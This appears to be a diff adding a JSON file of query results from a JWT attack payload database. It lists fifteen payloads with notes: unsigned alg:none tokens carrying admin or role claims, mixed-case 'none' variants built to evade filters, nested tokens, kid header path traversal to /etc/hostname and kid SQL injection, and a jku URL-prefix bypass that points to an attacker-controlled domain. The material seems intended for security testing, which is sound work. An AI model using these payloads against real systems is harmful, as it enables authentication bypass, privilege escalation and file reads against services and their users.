@@ -1,0 +1,289 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "jwt"
+  },
+  "count": 15,
+  "results": [
+    {
+      "id": "36ead965f497e928",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64.AA==",
+      "technique": "alg_none",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "PAYLOAD_B64"
+      ],
+      "notes": "JWT with alg:none and null byte signature (base64url of 0x00). Tests if signature validation treats null bytes as valid empty signatures.",
+      "source": "ensphere",
+      "tags": [
+        "none_algorithm",
+        "null_signature",
+        "parser_quirk"
+      ]
+    },
+    {
+      "id": "5db4bb3e3032fd91",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiZXhwIjo5OTk5OTk5OTk5fQ.",
+      "technique": "alg_none",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "JWT with alg:none and exp set to 9999999999 (year 2286). Tests if the server enforces reasonable token lifetimes or accepts arbitrarily far-future expiry.",
+      "source": "ensphere",
+      "tags": [
+        "exp_manipulation",
+        "far_future",
+        "none_algorithm",
+        "token_lifetime"
+      ]
+    },
+    {
+      "id": "06e2ac864c43ec71",
+      "payload": "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.PAYLOAD_B64.",
+      "technique": "alg_none",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "PAYLOAD_B64"
+      ],
+      "notes": "JWT with alg:nOnE (mixed case). Tests alternating-case variant to evade regex filters.",
+      "source": "ensphere",
+      "tags": [
+        "case_bypass",
+        "empty_signature",
+        "none_algorithm"
+      ]
+    },
+    {
+      "id": "0e8618a844bb3b2a",
+      "payload": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64.",
+      "technique": "alg_none",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "PAYLOAD_B64"
+      ],
+      "notes": "JWT with alg:None (title case). Bypasses case-sensitive checks that only block lowercase 'none'.",
+      "source": "ensphere",
+      "tags": [
+        "case_bypass",
+        "empty_signature",
+        "none_algorithm"
+      ]
+    },
+    {
+      "id": "11f768d39a7575a7",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiaXNzIjoiaHR0cHM6Ly90cnVzdGVkLWlkcC5jb20iLCJhdWQiOiJ0YXJnZXQtYXBwIn0.",
+      "technique": "alg_none",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "JWT with alg:none and spoofed iss (https://trusted-idp.com) and aud (target-app) claims. Tests if the server validates the issuer and audience or blindly trusts the claims.\n",
+      "source": "ensphere",
+      "tags": [
+        "aud_spoofing",
+        "iss_spoofing",
+        "none_algorithm",
+        "trust_boundary"
+      ]
+    },
+    {
+      "id": "1867e24f44815af2",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64.",
+      "technique": "alg_none",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "PAYLOAD_B64"
+      ],
+      "notes": "JWT with alg:none and empty signature. Server must accept unsigned tokens. Replace PAYLOAD_B64 with base64url-encoded claims.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "empty_signature",
+        "none_algorithm"
+      ]
+    },
+    {
+      "id": "2aaacb0a99f8b98e",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
+      "technique": "alg_none",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "JWT with alg:none and claims {sub:1, role:admin}. Targets apps that use a role claim for authorization decisions.",
+      "source": "ensphere",
+      "tags": [
+        "claim_tampering",
+        "none_algorithm",
+        "privesc",
+        "role_admin"
+      ]
+    },
+    {
+      "id": "7fac8456e1531379",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD_B64",
+      "technique": "alg_none",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "PAYLOAD_B64"
+      ],
+      "notes": "JWT with alg:none and no trailing dot (missing signature segment entirely). Some parsers accept two-part tokens.",
+      "source": "ensphere",
+      "tags": [
+        "missing_signature",
+        "none_algorithm",
+        "parser_quirk"
+      ]
+    },
+    {
+      "id": "85e958f77b906a78",
+      "payload": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.PAYLOAD_B64.",
+      "technique": "alg_none",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "PAYLOAD_B64"
+      ],
+      "notes": "JWT with alg:NONE (uppercase). Tests all-caps variant of the none algorithm bypass.",
+      "source": "ensphere",
+      "tags": [
+        "case_bypass",
+        "empty_signature",
+        "none_algorithm"
+      ]
+    },
+    {
+      "id": "963be3e40d8c6907",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwidG9rZW4iOiJleUpoYkdjaU9pSnViMjVsSWl3aWRIbHdJam9pU2xkVUluMC5leUp6ZFdJaU9pSXhJaXdpWVdSdGFXNGlPblJ5ZFdWOS4ifQ.",
+      "technique": "alg_none",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Nested JWT: outer token contains an inner JWT in a 'token' claim. The inner JWT also uses alg:none with admin:true. Tests if the server recursively parses and trusts nested JWT structures without proper validation.\n",
+      "source": "ensphere",
+      "tags": [
+        "claim_tampering",
+        "nested_jwt",
+        "none_algorithm",
+        "parser_quirk"
+      ]
+    },
+    {
+      "id": "a1b4711e9c50ac45",
+      "payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../etc/hostname\"}",
+      "technique": "kid_injection",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "kid path traversal to /etc/hostname. If the server reads the file content as the HMAC key, sign with the hostname value. Can confirm file read capability.",
+      "source": "ensphere",
+      "tags": [
+        "file_read",
+        "kid",
+        "path_traversal"
+      ]
+    },
+    {
+      "id": "a933274d98824987",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.",
+      "technique": "alg_none",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "JWT with alg:none and claims {sub:1, admin:true}. Tests both signature bypass and privilege escalation via admin claim.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "claim_tampering",
+        "none_algorithm",
+        "privesc"
+      ]
+    },
+    {
+      "id": "b8da26b3972e047f",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwiY3R5IjoiSldUIn0.INNER_JWT.",
+      "technique": "alg_confusion",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [
+        "INNER_JWT"
+      ],
+      "notes": "Nested JWT using cty:JWT header. RFC 7519 specifies that cty:JWT indicates a nested token. Replace INNER_JWT with a base64url-encoded inner JWS. Some libraries may auto-unwrap and trust the inner token without verifying the outer signature.\n",
+      "source": "ensphere",
+      "tags": [
+        "cty_header",
+        "nested_jwt",
+        "parser_quirk",
+        "rfc7519"
+      ]
+    },
+    {
+      "id": "be656f736ebcb65e",
+      "payload": "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://trusted-domain.com/.well-known/jwks.json/../../../COLLAB_DOMAIN/jwks.json\"}",
+      "technique": "jku_spoofing",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "jku with path traversal bypass. Starts with a trusted domain prefix but traverses to attacker endpoint. Tests weak URL prefix validation.",
+      "source": "ensphere",
+      "tags": [
+        "jku",
+        "oob",
+        "path_traversal",
+        "url_bypass"
+      ]
+    },
+    {
+      "id": "e2c0fda0873c5e14",
+      "payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"' OR '1'='1\"}",
+      "technique": "kid_injection",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "error",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "kid header with boolean-based SQL injection. May cause the server to return the first key in the database or trigger a SQL error revealing backend info.",
+      "source": "ensphere",
+      "tags": [
+        "boolean",
+        "error_based",
+        "kid",
+        "sqli"
+      ]
+    }
+  ]
+}
